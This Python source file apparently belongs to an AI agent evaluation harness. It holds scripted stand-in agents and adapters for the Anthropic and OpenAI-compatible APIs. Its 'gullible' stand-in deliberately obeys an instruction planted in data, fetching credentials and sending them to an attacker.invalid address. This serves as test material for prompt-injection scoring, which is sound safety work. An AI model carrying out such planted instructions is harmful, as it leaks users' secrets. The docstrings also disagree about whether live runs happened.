"""Agents for the harness: deterministic SCRIPTED stand-ins (NOT language models) and a real Anthropic Messages API agent.

The scripted agents exist so the whole pipeline (derive, run, verify, compare, certificate) can be built and tested at zero cost and with exactly reproducible behaviour. They parse
the public prompt and follow a fixed policy: `lean` uses the efficient tools, `bare` takes the expensive route (reads rows one page at a time, one transfer per turn, no test run,
more chatter), `flaky:P` makes a seeded mistake with probability P on each trial, `cheat` guesses without looking. A result from a scripted agent says something about the PIPELINE
and about what a policy costs; it says nothing about any model. The comparison files label them.

The Anthropic agent uses the official `anthropic` SDK (optional dependency, imported only when one is built); this module never reads, stores or prints a key. It has NOT been run
against the live API from this project (no key was used while building it): run `agent_eval.py run ... --agent anthropic:MODEL` on ONE instance first. Every run costs real API money;
agent_eval.py refuses to start one without --confirm-api-spend.
"""
import json
import os
import re
import time
import urllib.error
import urllib.parse
import urllib.request

import agent_core
from agent_domains import toolstate

STYLES = ("lean", "bare", "cheat", "gullible")   # gullible: like lean, but obeys instructions planted in data (only meaningful in the injection domain)


class ScriptedAgent:
    def __init__(self, domain, style="lean", p_fail=0.0, label=None):
        if style not in STYLES:
            raise agent_core.AgentEvalError("unknown scripted style %r (known: %s)" % (style, ", ".join(STYLES)))
        self.domain, self.style, self.p_fail = domain.split(":")[0], style, float(p_fail)      # a sealed domain ("research:sealed") reads exactly like its base
        self.label = label or "scripted-%s-%s" % (style, p_fail)
        self.iid, self.trial = "", 0

    def begin(self, instance_id, trial):
        self.iid, self.trial = instance_id, trial

    def _fails(self):
        return agent_core.trial_coin(self.label, self.iid, self.trial) < self.p_fail

    def _chatter(self):
        return "Let me work through this step by step and check each part before moving on. " * (6 if self.style == "bare" else 0)

    def respond(self, system, tools, messages):
        n = sum(1 for m in messages if m["role"] == "assistant")
        prompt = messages[0]["content"]
        text, calls = getattr(self, "_" + self.domain)(prompt, messages, n)
        return {"text": text + self._chatter() if calls else text, "tool_calls": calls}

    @staticmethod
    def _submit(answer):
        return {"name": "submit", "args": {"answer": answer}}

    @staticmethod
    def _last_tool(messages):
        for m in reversed(messages):
            if m["role"] == "tool":
                return m["results"]
        return []

    # --- dataanalysis ---------------------------------------------------------------------------------------------------------------------------------
    def _parse_question(self, prompt):
        m = re.search(r"Over the rows where (.*), what is (.*?)\?", prompt)
        where = []
        for part in m.group(1).split(" and "):
            pm = re.match(r"(\w+) (==|!=|>=|<=|>|<) (.+)$", part.strip())
            v = pm.group(3)
            where.append([pm.group(1), pm.group(2), v[1:-1] if v.startswith("'") else int(v)])
        what = m.group(2)
        if what == "the number of rows":
            return "count", "id", where
        wm = re.match(r"the (sum|mean|minimum|maximum) of (\w+)", what)
        return {"sum": "sum", "mean": "mean", "minimum": "min", "maximum": "max"}[wm.group(1)], wm.group(2), where

    def _dataanalysis(self, prompt, messages, n):
        op, col, where = self._parse_question(prompt)
        if self.style == "cheat":
            return "", [self._submit(0)]
        if self.style == "lean":
            if n == 0:
                return "", [{"name": "aggregate", "args": {"op": op, "column": col, "where": where}}]
            out = self._last_tool(messages)[0]["content"]
            val = 0.0 if out.startswith("none") else float(out)
            val = (round(val, 2) if op == "mean" else int(round(val)))
        else:
            total = int(re.search(r"has (\d+) rows", prompt).group(1))
            pages = (total + 49) // 50
            if n == 0:
                return "", [{"name": "describe", "args": {}}]
            if n <= pages:
                return "", [{"name": "rows", "args": {"offset": (n - 1) * 50, "limit": 50}}]
            rows = []
            for m in messages:
                if m["role"] == "tool":
                    for r in m["results"]:
                        if r["name"] == "rows" and r["content"] != "(no more rows)":
                            for ln in r["content"].split("\n"):
                                g, x, y, z = ln.split(",")[1:]
                                rows.append({"g": g, "x": int(x), "y": int(y), "z": int(z), "id": int(ln.split(",")[0])})
            from agent_domains import dataanalysis
            val = dataanalysis.aggregate(rows, op, col, [tuple(w) for w in where])
            val = 0 if val is None else (round(val, 2) if op == "mean" else val)
        if self._fails():
            val = val + 1
        return "", [self._submit(val)]

    # --- toolstate ------------------------------------------------------------------------------------------------------------------------------------
    def _plan(self, messages, prompt):
        bal = {}
        for r in self._first_balances(messages):
            for part in r.split(", "):
                k, v = part.split("=")
                bal[k] = int(v)
        m = int(re.search(r"at least (\d+)", prompt).group(1))
        plan = toolstate.reference_calls({"private": {"initial": bal}, "public": {"minimum": m}})
        if self._fails() and plan:
            plan = plan[:-1]
        return plan

    @staticmethod
    def _first_balances(messages):
        for m in messages:
            if m["role"] == "tool":
                for r in m["results"]:
                    if r["name"] == "balances":
                        return [r["content"]]
        return []

    def _toolstate(self, prompt, messages, n):
        if self.style == "cheat":
            return "", [self._submit("done")]
        if n == 0:
            return "", [{"name": "balances", "args": {}}]
        plan = self._plan(messages, prompt)
        if self.style == "lean":
            return ("", plan) if n == 1 else ("", [self._submit("done")])
        if n - 1 < len(plan):
            return "", [plan[n - 1]]
        if n - 1 == len(plan):
            return "", [{"name": "balances", "args": {}}]
        return "", [self._submit("done")]

    # --- coding ---------------------------------------------------------------------------------------------------------------------------------------
    def _source(self, prompt):
        lines = [ln for ln in prompt.split("\n") if re.match(r"\d+\. ", ln)]
        code = ["def solve(xs):"]
        pats = [(r"keep only the elements x with x % (\d+) == (\d+)", lambda a: "xs = [x for x in xs if x %% %s == %s]" % a),
                (r"replace every element x by x \* (\d+) \+ (-?\d+)", lambda a: "xs = [x * %s + %s for x in xs]" % a),
                (r"keep only the elements x with x >= (-?\d+)", lambda a: "xs = [x for x in xs if x >= %s]" % a),
                (r"remove repeated values", lambda a: "xs = list(dict.fromkeys(xs))"),
                (r"sort the list in descending order", lambda a: "xs = sorted(xs, reverse=True)"),
                (r"replace the list by its running sums", lambda a: "xs = [sum(xs[:i + 1]) for i in range(len(xs))]"),
                (r"keep only the first (\d+) elements", lambda a: "xs = xs[:%s]" % a),
                (r"reverse the list", lambda a: "xs = xs[::-1]")]
        body = []
        for ln in lines:
            text = ln.split(". ", 1)[1]
            for pat, mk in pats:
                m = re.match(pat, text)
                if m:
                    body.append("    " + mk(m.groups()))
                    break
        if self._fails() and body:
            body = body[:-1]
        return "\n".join(code + body + ["    return xs"]) + "\n"

    def _coding(self, prompt, messages, n):
        if self.style == "cheat":
            return "", [self._submit("def solve(xs):\n    return xs\n")]
        src = self._source(prompt)
        if self.style == "lean":
            return ("", [{"name": "run_tests", "args": {"source": src}}]) if n == 0 else ("", [self._submit(src)])
        if n == 0:
            return "", [{"name": "run_tests", "args": {"source": src}}]
        if n == 1:
            return "", [{"name": "run_tests", "args": {"source": src}}]
        return "", [self._submit(src)]

    # --- research -------------------------------------------------------------------------------------------------------------------------------------
    @staticmethod
    def _call_results(messages):
        """[(call, result content)] in order, pairing each assistant tool call with its result by position."""
        out, pending = [], []
        for m in messages:
            if m["role"] == "assistant":
                pending = list(m["tool_calls"])
            elif m["role"] == "tool":
                by = {c["id"]: c for c in pending}
                for r in m["results"]:
                    out.append((by.get(r["id"], {"name": r["name"], "args": {}}), r["content"]))
        return out

    def _research(self, prompt, messages, n):
        from agent_domains import research
        if self.style == "cheat":
            return "", [self._submit(0)]
        start = re.search(r"Start at '(.+?)'", prompt).group(1)
        steps = len(re.findall(r"\(\d+\) ", prompt))
        titles, hits, opened_ids = {}, {}, set()
        for call, content in self._call_results(messages):
            if call["name"] == "search":
                hits[call["args"].get("query")] = [ln.split(" ", 1) for ln in content.split("\n") if re.match(r"D\d+ ", ln)]
            elif call["name"] == "open" and not content.startswith("error"):
                opened_ids.add(call["args"].get("doc_id"))
                tm = re.match(r"(.+?) is an? (organisation|person|city)\.", content)
                if tm:
                    titles[tm.group(1)] = research.parse_doc(content)
        cur, hop = start, 0
        while True:
            if cur not in titles:
                if cur not in hits:
                    return "", [{"name": "search", "args": {"query": cur}}]
                if self.style == "bare":
                    for did, _t in hits[cur]:
                        if did not in opened_ids:
                            return "", [{"name": "open", "args": {"doc_id": did}}]
                for did, t in hits[cur]:
                    if t == cur:
                        return "", [{"name": "open", "args": {"doc_id": did}}]
                return "", [self._submit(0)]
            doc = titles[cur]
            if hop == steps:
                val = doc["value"] + (1 if self._fails() else 0)
                return "", [self._submit(val)]
            cur, hop = doc["next"], hop + 1

    # --- injection (safety) ---------------------------------------------------------------------------------------------------------------------------
    def _injection(self, prompt, messages, n):
        vendor = re.search(r"from vendor (\w+)", prompt).group(1)
        if self.style == "cheat":
            return "", [self._submit(0)]
        done = self._call_results(messages)
        if not done:
            return "", [{"name": "list", "args": {}}]
        listing = done[0][1]
        ids = [ln.split(" | ")[0] for ln in listing.split("\n") if ln.split(" | ")[1] == vendor] if self.style != "bare" else [ln.split(" | ")[0] for ln in listing.split("\n")]
        read = {c["args"].get("id"): content for c, content in done if c["name"] == "read"}
        if self.style == "bare":
            nxt = [i for i in ids if i not in read]
            if nxt:
                return "", [{"name": "read", "args": {"id": nxt[0]}}]
        elif not read:
            return "", [{"name": "read", "args": {"id": i}} for i in ids]
        total = 0
        for body in read.values():
            if body.startswith("From: %s\n" % vendor):
                m = re.search(r"Order: (\d+) units at (\d+) each", body)
                total += int(m.group(1)) * int(m.group(2))
        if self.style == "gullible":
            sent = [c for c, _ in done if c["name"] == "send_message"]
            cred = [content for c, content in done if c["name"] == "get_credentials"]
            if any("get_credentials" in b for b in read.values()):
                if not cred:
                    return "", [{"name": "get_credentials", "args": {}}]
                if not sent:
                    # obey the planted instruction: send to the address IT names (the sealed variants use other addresses)
                    am = next((re.search(r"[\w.+-]+@[\w.-]+\.invalid", b) for b in read.values() if "get_credentials" in b), None)
                    return "", [{"name": "send_message", "args": {"to": am.group(0) if am else "collect@attacker.invalid", "body": cred[0]}}]
        return "", [self._submit(total + (1 if self._fails() else 0))]

    # --- toyctf (safety / capability) -----------------------------------------------------------------------------------------------------------------
    def _toyctf(self, prompt, messages, n):
        from agent_domains import toyctf
        if self.style == "cheat":
            return "", [self._submit("FLAG-0000000000000000")]
        m = re.search(r"Start at (\S+) with token (\S+)\.", prompt)
        host, token = m.group(1), m.group(2)
        done = self._call_results(messages)
        scanned = [content for c, content in done if c["name"] == "scan"]
        if self.style == "bare" and not scanned:
            return "", [{"name": "scan", "args": {}}]
        notes = [(c, content) for c, content in done if c["name"] == "connect"]
        hosts = scanned[0].split(", ") if scanned else []
        probes = [c for c, content in notes if content == "denied"]
        good = [(c, content) for c, content in notes if content != "denied" and not content.startswith("error")]
        if good:
            note = good[-1][1]
            fm = re.search(r"the flag is ([A-Z]+-[0-9a-f]+)", note)
            if fm:
                flag = fm.group(1)
                return "", [self._submit(flag[:-1] + ("0" if flag[-1] != "0" else "1") if self._fails() else flag)]
            hm = re.search(r"next host is (\S+), token \(each letter moved forward by (\d+) places.*?\) (\w+)\.", note)
            host, token = hm.group(1), toyctf.decode(hm.group(3), int(hm.group(2)))
        if self.style == "bare" and hosts and not any(c["args"].get("token") == token and content == "denied" for c, content in notes):
            other = next((h for h in hosts if h != host and h not in [c["args"].get("host") for c in probes]), None)
            if other:
                return "", [{"name": "connect", "args": {"host": other, "token": token}}]
        return "", [{"name": "connect", "args": {"host": host, "token": token}}]

    # --- bugfix ---------------------------------------------------------------------------------------------------------------------------------------
    def _bugfix(self, prompt, messages, n):
        """lean: run the public tests, read only the modules that fail, undo the catalogued bug in each failing function, check once, submit. bare: read every file first and re-run the tests after
        every single edit. Both know the bug CATALOG (a stand-in for a competent reader); neither is a model."""
        from agent_domains import bugfix
        if self.style == "cheat":
            return "", [self._submit("done")]
        done = self._call_results(messages)
        if not done:
            return "", [{"name": "list_files", "args": {}}] if self.style == "bare" else [{"name": "run_tests", "args": {}}]
        listing = next((x for c, x in done if c["name"] == "list_files"), "")
        paths = sorted(set(re.findall(r"^(pkg/m\d+\.py) \(", listing, re.M)))
        read = {c["args"].get("path"): x for c, x in done if c["name"] == "read_file"}
        tests = [x for c, x in done if c["name"] == "run_tests"]
        edits = [c for c, x in done if c["name"] == "edit_file"]
        if self.style == "bare" and paths:
            unread = [p for p in paths if p not in read]
            if unread:
                return "", [{"name": "read_file", "args": {"path": unread[0]}}]
            if not tests:
                return "", [{"name": "run_tests", "args": {}}]
        first = tests[0] if tests else ""
        failing = []
        for m in re.finditer(r"^FAIL (m\d+)\.(\w+):", first, re.M):
            if (m.group(1), m.group(2)) not in failing:
                failing.append((m.group(1), m.group(2)))
        if self.style == "lean":
            need = sorted(set("pkg/%s.py" % mod for mod, _fn in failing) - set(read))
            if need:
                return "", [{"name": "read_file", "args": {"path": p}} for p in need]
        found = []
        for mod, fn in failing:
            path = "pkg/%s.py" % mod
            for old, new, occ, pos in bugfix.repairs(read.get(path, ""), fn):
                args = {"path": path, "old": old, "new": new}
                if read[path].count(old) > 1:
                    args["occurrence"] = occ
                found.append((path, pos, {"name": "edit_file", "args": args}))
        # back to front WITHIN each file, across all its functions: an earlier edit must never change the occurrence index of a later one
        todo = [c for _p, _pos, c in sorted(found, key=lambda t: (t[0], -t[1]))]
        if self.style == "lean":
            if todo and not edits:
                if self._fails():
                    todo = todo[:-1]
                return "", todo
            if edits and len(tests) < 2:
                return "", [{"name": "run_tests", "args": {}}]
            return "", [self._submit("done")]
        # bare: one edit per turn, tests after each
        if len(edits) < len(todo):
            if self._fails() and len(edits) == len(todo) - 1:
                return "", [self._submit("done")]
            if len(tests) > len(edits):
                return "", [todo[len(edits)]]
            return "", [{"name": "run_tests", "args": {}}]
        return "", [self._submit("done")] if len(tests) > len(edits) else [{"name": "run_tests", "args": {}}]


class AnthropicAgent:
    """A real model through the official `anthropic` SDK (an OPTIONAL dependency, imported only here: `pip install anthropic`). Checked against the SDK's current guidance on 11-27:

    * NO sampling parameters are sent (`temperature`, `top_p`, `top_k` are removed or restricted on the current models and return a 400);
    * `max_tokens` defaults to 16000: thinking is always on for the current models and its tokens count against it, so a small value truncates the answer;
    * the model's `thinking` blocks are kept (opaque, signed) and echoed back unchanged on every later turn of the same trial, as the API requires for the same model; they are NOT in the
      stored trajectory or the proxy token count (the provider's usage numbers include them, which is part of the provider/proxy gap the comparison reports);
    * `stop_reason == "refusal"` ends the trial as a failure with the category in the transcript; `max_tokens` truncation does too;
    * NO server-side fallback is enabled: a silent switch to another model would make "which model" meaningless. `served` counts the model ids the API reports, and agent_eval warns if any
      differs from the one asked for;
    * credentials come from the SDK's own resolution (ANTHROPIC_API_KEY, or an `ant auth login` profile): this module never reads, stores or prints a key.

    RUN against the live API on 27 Nov (claude-haiku-4-5 and claude-sonnet-5-5: AGENT_EVAL.md, "The first runs against the live Anthropic API"); before that it had only been tested with fakes. Request building and response handling are tested with a fake client and, where the SDK is
    installed, with the real SDK over a mock transport; the first live run should be ONE instance."""

    def __init__(self, model="claude-opus-5-5", max_tokens=16000, effort=None, client=None, timeout=300.0, max_retries=4):
        self.model, self.max_tokens, self.effort = model, max_tokens, effort
        if client is None:
            try:
                import anthropic
            except ImportError:
                raise agent_core.AgentEvalError("the `anthropic` package is not installed (it is an optional dependency, needed only for real-model runs): pip install anthropic")
            try:
                client = anthropic.Anthropic(timeout=timeout, max_retries=max_retries)
            except Exception as e:
                raise agent_core.AgentEvalError("the Anthropic client could not be built (%s: %s)" % (type(e).__name__, str(e)[:160]))
            # MEASURED with the real SDK (2.14.0): the constructor does NOT raise without a credential and makes no network call; the missing credential only surfaces as a TypeError on the first
            # request, which a run would record as an agent error on every trial. Ask the SDK's own offline check now, so a run without a credential stops before it starts.
            if credentials_resolve(client) is False:
                raise agent_core.AgentEvalError("no Anthropic credentials found: set ANTHROPIC_API_KEY (or ANTHROPIC_AUTH_TOKEN) or run `ant auth login`")
        self.client = client
        self.label = "anthropic-" + model + (("-" + effort) if effort else "")
        self.served = {}
        self._raw = []

    def begin(self, instance_id, trial):
        self._raw = []

    def convert(self, messages):
        """Harness messages -> API messages. Assistant turns this agent produced are sent back as the ORIGINAL content blocks (thinking included) with the API's own tool_use ids."""
        n_asst = sum(1 for m in messages if m["role"] == "assistant")
        use_raw = len(self._raw) == n_asst
        out, ids, k = [], {}, 0
        for m in messages:
            if m["role"] == "user":
                out.append({"role": "user", "content": m["content"]})
            elif m["role"] == "assistant":
                if use_raw:
                    content = list(self._raw[k])
                    uses = [b for b in content if getattr(b, "type", None) == "tool_use"]
                    ids = {"c%d" % i: b.id for i, b in enumerate(uses)}
                else:
                    content = [{"type": "text", "text": m["text"]}] if m["text"] else []
                    ids = {}
                    for c in m["tool_calls"]:
                        ids[c["id"]] = "toolu_t%d_%s" % (k, c["id"])
                        content.append({"type": "tool_use", "id": ids[c["id"]], "name": c["name"], "input": c["args"]})
                k += 1
                out.append({"role": "assistant", "content": content})
            else:
                out.append({"role": "user", "content": [{"type": "tool_result", "tool_use_id": ids.get(r["id"], r["id"]), "content": r["content"]} for r in m["results"]]})
        return out

    def respond(self, system, tools, messages):
        kwargs = {"model": self.model, "max_tokens": self.max_tokens, "system": system, "messages": self.convert(messages),
                  "tools": [{"name": t["name"], "description": t["description"], "input_schema": t["input_schema"]} for t in tools]}
        if self.effort:
            kwargs["output_config"] = {"effort": self.effort}
        resp = self.client.messages.create(**kwargs)
        self.served[resp.model] = self.served.get(resp.model, 0) + 1
        content = list(resp.content)
        self._raw.append(content)
        text = "".join(b.text for b in content if b.type == "text")
        calls = [{"name": b.name, "args": dict(b.input)} for b in content if b.type == "tool_use"]
        stop = getattr(resp, "stop_reason", None)
        if stop == "refusal":
            details = getattr(resp, "stop_details", None)
            text, calls = (text + " " if text else "") + "[model refused: %s]" % (getattr(details, "category", None) or "no category"), []
        elif stop == "max_tokens":
            text, calls = (text + " " if text else "") + "[truncated: max_tokens]", []
        u = resp.usage
        usage = {"input_tokens": int(u.input_tokens or 0) + int(getattr(u, "cache_creation_input_tokens", 0) or 0) + int(getattr(u, "cache_read_input_tokens", 0) or 0),
                 "output_tokens": int(u.output_tokens or 0)}
        return {"text": text, "tool_calls": calls, "usage": usage}


COMPAT_MODEL_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._:/\-]{0,100}$")
LOCAL_HOSTS = ("localhost", "127.0.0.1", "::1", "[::1]")
MAX_REPLY_BYTES = 8 * 1024 * 1024        # a chat completion is a few KB; a hostile or broken endpoint must not make us read without bound
MAX_TOOL_CALLS_PER_REPLY = 64
MAX_REPLY_TEXT = 200000
MAX_SERVED_NAMES = 16


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """urllib follows 301/302/303 by re-sending the request as a GET WITH ITS HEADERS, including `Authorization`: the API key would go to whatever origin the endpoint names, and the redirect
    target's answer would be taken for the model's. Found by test. A 3xx is now an error (HTTPError), never followed."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _reject_constant(name):
    raise ValueError("%s is not valid JSON" % name)


def _loads(text):
    """json.loads that refuses NaN/Infinity (the harness cannot store them) and turns a recursion bomb into the same ValueError as any other bad JSON."""
    try:
        return json.loads(text, parse_constant=_reject_constant)
    except RecursionError:
        raise ValueError("JSON nested too deeply")


def credentials_resolve(client):
    """True if the Anthropic SDK client would send a credential, False if it would refuse the first request for lack of one, None if this SDK does not offer the check. It asks the SDK's OWN offline
    validation (the one it runs before every request) on the client's default headers: it makes no request and does not read the credential's value. Checked against SDK 2.14.0 with sockets blocked:
    no credential -> False; ANTHROPIC_API_KEY or ANTHROPIC_AUTH_TOKEN -> True; a stored-credentials (login profile) client passes by the SDK's own rule. It uses a private method, so a different SDK
    may answer None, and callers must treat None as 'cannot tell', never as 'fine'."""
    probe, headers = getattr(client, "_validate_headers", None), getattr(client, "default_headers", None)
    if not callable(probe) or headers is None:
        return None
    try:
        probe(headers, frozenset())
        return True
    except TypeError:
        return False
    except Exception:
        return None


def is_real_model(spec):
    """True for any agent spec that calls a model (anything that is not a scripted stand-in): such a run needs the operator's explicit --confirm-api-spend."""
    return not str(spec).startswith(("scripted", "blackbox:"))          # a black-box vendor agent runs on the vendor's machine at the vendor's cost: nothing here calls a model


def parse_chat_completion(data):
    """(reply, served model name or None) from a decoded Chat Completions response. ONE function, used by the adapter AND by the recording proxy's verifier (agent_proxy), so that what the
    adapter stored and what the proxy re-derives from the signed response bytes are normalised identically (truncation and refusal notes, invalid arguments, caps). Raises AgentEvalError
    if the reply has no choices[0].message."""
    choices = data.get("choices") if isinstance(data, dict) else None
    if not choices or not isinstance(choices[0], dict) or not isinstance(choices[0].get("message"), dict):
        raise agent_core.AgentEvalError("the model server's reply has no choices[0].message")
    msg, finish = choices[0]["message"], choices[0].get("finish_reason")
    served = data.get("model")
    served = served[:100] if isinstance(served, str) else None
    content = msg.get("content")
    if isinstance(content, list):                                   # some servers return content parts
        content = "".join(p.get("text", "") for p in content if isinstance(p, dict))
    text = content if isinstance(content, str) else ""
    if len(text) > MAX_REPLY_TEXT:                                  # the trial will end over its token cap anyway; do not store megabytes of it in the ladder
        text = text[:MAX_REPLY_TEXT] + " [cut by the adapter: reply text over %d characters]" % MAX_REPLY_TEXT
    calls = []
    tool_calls = msg.get("tool_calls")
    for tc in (tool_calls if isinstance(tool_calls, list) else [])[:MAX_TOOL_CALLS_PER_REPLY]:
        fn = tc.get("function") if isinstance(tc, dict) else None
        if not isinstance(fn, dict) or not isinstance(fn.get("name"), str):
            continue
        raw = fn.get("arguments")
        try:
            args = _loads(raw) if isinstance(raw, str) and raw.strip() else ({} if raw is None or raw == "" else raw)
        except ValueError:
            args = None
        calls.append({"name": fn["name"], "args": args if isinstance(args, dict) else {"__invalid_arguments__": str(raw)[:500]}})
    note = None
    if isinstance(msg.get("refusal"), str) and msg["refusal"]:
        note, calls = "[model refused: %s]" % msg["refusal"][:200], []
    elif finish == "content_filter":
        note, calls = "[model refused: content_filter]", []
    elif finish == "length":
        note, calls = "[truncated: length]", []
    if note:
        text = (text + " " if text else "") + note
    u = data.get("usage") if isinstance(data.get("usage"), dict) else None
    usage = None
    if u and all(isinstance(u.get(k), int) and not isinstance(u.get(k), bool) and 0 <= u[k] <= 10 ** 9 for k in ("prompt_tokens", "completion_tokens")):
        usage = {"input_tokens": u["prompt_tokens"], "output_tokens": u["completion_tokens"]}
    reply = {"text": text, "tool_calls": calls}
    if usage is not None:
        reply["usage"] = usage
    return reply, served


class OpenAICompatAgent:
    """Any server that speaks the OpenAI Chat Completions protocol: OpenAI itself, vLLM, OpenRouter, LM Studio, llama.cpp's server, Ollama (`/v1`), and so on. Standard library only (plain JSON
    over HTTP), so a LOCAL model needs no package and costs nothing. Spec: `compat:MODEL` (a model id may contain ':' or '/': `compat:llama3.1:8b`, `compat:meta-llama/Llama-3.1-8B-Instruct`).

    THE ENDPOINT IS THE OPERATOR'S, NEVER THE ENTRANT'S: the base URL comes only from GULDO_COMPAT_BASE_URL or OPENAI_BASE_URL (default https://api.openai.com/v1), and a spec cannot carry one,
    so an entrant cannot make the operator's machine call an arbitrary URL. The key comes from GULDO_COMPAT_API_KEY or OPENAI_API_KEY (optional: local servers need none); it is sent only as an
    Authorization header, never stored, never put in a label or a ladder, and REFUSED over plain http to a non-local host (it would travel in the clear). Only the host (no credentials, no path)
    is recorded, as the ladder header's agent.endpoint.

    Sampling parameters are NOT sent unless you pass one (some current models reject them). `max_tokens_param` is "max_tokens" (vLLM, Ollama, most servers) or "max_completion_tokens" (OpenAI's
    newer models). A truncated reply (finish_reason "length") or a refusal ends the trial as a failure with a note, exactly as the Anthropic adapter does; tool-call arguments that are not valid JSON
    become a call the tool rejects (the model sees the error) instead of a crash. Models that think emit their reasoning in a separate field: it is ignored, so it is not in the stored trajectory or
    the proxy token count (the server's own usage includes it: part of the provider/proxy gap the comparison reports). The server's usage numbers are recorded when it sends them.

    Tested against a real local HTTP server speaking the protocol (urllib, retries, errors, a whole trial through the harness) and never against a real vendor's endpoint or a real model."""

    def __init__(self, model, base_url=None, api_key=None, max_tokens=4096, max_tokens_param="max_tokens", temperature=None, timeout=300.0, retries=4, opener=None, sleep=time.sleep):
        if not isinstance(model, str) or not COMPAT_MODEL_RE.match(model):
            raise agent_core.AgentEvalError("not a model id: %r" % (model,))
        base = (base_url or os.environ.get("GULDO_COMPAT_BASE_URL") or os.environ.get("OPENAI_BASE_URL") or "https://api.openai.com/v1").rstrip("/")
        u = urllib.parse.urlsplit(base)
        if u.scheme not in ("http", "https") or not u.hostname or u.username or u.password or u.query or u.fragment:
            raise agent_core.AgentEvalError("the base URL must be http(s)://host[:port]/path with no credentials, query or fragment")
        key = api_key if api_key is not None else (os.environ.get("GULDO_COMPAT_API_KEY") or os.environ.get("OPENAI_API_KEY") or "")
        if key and u.scheme == "http" and u.hostname not in LOCAL_HOSTS:
            raise agent_core.AgentEvalError("refusing to send an API key over plain http to %s: use https (or a local server)" % u.hostname)
        if max_tokens_param not in ("max_tokens", "max_completion_tokens"):
            raise agent_core.AgentEvalError("max_tokens_param must be max_tokens or max_completion_tokens")
        self.model, self.max_tokens, self.max_tokens_param, self.temperature = model, max_tokens, max_tokens_param, temperature
        self.url, self._key, self.timeout, self.retries = base + "/chat/completions", key, timeout, retries
        self.endpoint = u.netloc
        self.label = "compat-" + model
        self.served = {}
        self._open, self._sleep = opener or urllib.request.build_opener(_NoRedirect).open, sleep

    def convert(self, system, messages):
        out = [{"role": "system", "content": system}]
        ids, k = {}, 0
        for m in messages:
            if m["role"] == "user":
                out.append({"role": "user", "content": m["content"]})
            elif m["role"] == "assistant":
                # content may be null ONLY when tool calls are present: a reply with no text and no tool calls (a model's empty answer) must be sent as "", or a strict server (Ollama, found on the
                # first real run) answers 400 "invalid message content type: <nil>" and the whole trial dies
                msg = {"role": "assistant", "content": m["text"] or (None if m["tool_calls"] else "")}
                if m["tool_calls"]:
                    ids = {c["id"]: "call_%d_%s" % (k, c["id"]) for c in m["tool_calls"]}
                    msg["tool_calls"] = [{"id": ids[c["id"]], "type": "function", "function": {"name": c["name"], "arguments": json.dumps(c["args"])}} for c in m["tool_calls"]]
                k += 1
                out.append(msg)
            else:
                for r in m["results"]:
                    out.append({"role": "tool", "tool_call_id": ids.get(r["id"], r["id"]), "content": r["content"]})
        return out

    def _post(self, payload):
        data = json.dumps(payload).encode("utf-8")
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        if self._key:
            headers["Authorization"] = "Bearer " + self._key
        last = None
        for attempt in range(self.retries + 1):
            req = urllib.request.Request(self.url, data=data, method="POST", headers=headers)
            try:
                with self._open(req, timeout=self.timeout) as resp:
                    raw = resp.read(MAX_REPLY_BYTES + 1)
                    if len(raw) > MAX_REPLY_BYTES:
                        raise agent_core.AgentEvalError("the model server's reply is larger than %d bytes: refusing to read more" % MAX_REPLY_BYTES)
                    return _loads(raw.decode("utf-8"))
            except urllib.error.HTTPError as e:
                body = ""
                try:
                    raw_body = e.read(4096).decode("utf-8", "replace")
                    if self._key:
                        raw_body = raw_body.replace(self._key, "***")                    # redact BEFORE truncating: a key straddling the cut would otherwise leak
                    body = raw_body[:300]
                except Exception:
                    pass
                retry_after = e.headers.get("Retry-After") if e.headers else None
                e.close()
                if e.code in (408, 409, 429, 500, 502, 503, 504) and attempt < self.retries:
                    last = "HTTP %d" % e.code
                    wait = min(30.0, float(retry_after)) if retry_after and retry_after.replace(".", "", 1).isdigit() else min(30.0, 2.0 ** attempt)
                    self._sleep(wait)
                    continue
                raise agent_core.AgentEvalError("the model server answered HTTP %d: %s" % (e.code, body))
            except (urllib.error.URLError, OSError) as e:                   # OSError covers socket.timeout (a plain OSError on Python 3.9, a TimeoutError only from 3.10), resets and refusals
                last = type(e).__name__
                if attempt < self.retries:
                    self._sleep(min(30.0, 2.0 ** attempt))
                    continue
                raise agent_core.AgentEvalError("could not reach the model server at %s (%s)" % (self.endpoint, last))
            except (ValueError, UnicodeDecodeError):
                raise agent_core.AgentEvalError("the model server did not answer with valid JSON")
        raise agent_core.AgentEvalError("the model server kept failing (%s)" % last)

    def respond(self, system, tools, messages):
        payload = {"model": self.model, "messages": self.convert(system, messages), self.max_tokens_param: self.max_tokens}
        if tools:
            payload["tools"] = [{"type": "function", "function": {"name": t["name"], "description": t["description"], "parameters": t["input_schema"]}} for t in tools]
        if self.temperature is not None:
            payload["temperature"] = self.temperature
        reply, served = parse_chat_completion(self._post(payload))
        if served is not None:
            name = served if (served in self.served or len(self.served) < MAX_SERVED_NAMES) else "(other)"      # a hostile server must not grow this without bound
            self.served[name] = self.served.get(name, 0) + 1
        return reply


def make_agent(spec, domain):
    """'scripted:lean', 'scripted:bare', 'scripted:lean:0.2' (fails 20% of trials), 'scripted:cheat', 'anthropic:MODEL[:EFFORT]', 'compat:MODEL' (any OpenAI-compatible server)."""
    parts = spec.split(":")
    if parts[0] == "compat":
        return OpenAICompatAgent(":".join(parts[1:]))
    if parts[0] == "scripted" and len(parts) >= 2:
        p = float(parts[2]) if len(parts) > 2 else 0.0
        if not 0.0 <= p <= 1.0:
            raise agent_core.AgentEvalError("failure probability must be in [0, 1]")
        return ScriptedAgent(domain, parts[1], p, label=spec)
    if parts[0] == "anthropic":
        effort = parts[2] if len(parts) > 2 and parts[2] else None
        if effort not in (None, "low", "medium", "high", "xhigh", "max"):
            raise agent_core.AgentEvalError("effort must be low, medium, high, xhigh or max")
        return AnthropicAgent(parts[1] if len(parts) > 1 and parts[1] else "claude-opus-5-5", effort=effort)
    raise agent_core.AgentEvalError("unknown agent spec %r (scripted:lean|bare|cheat[:P], anthropic:MODEL[:EFFORT], compat:MODEL)" % spec)
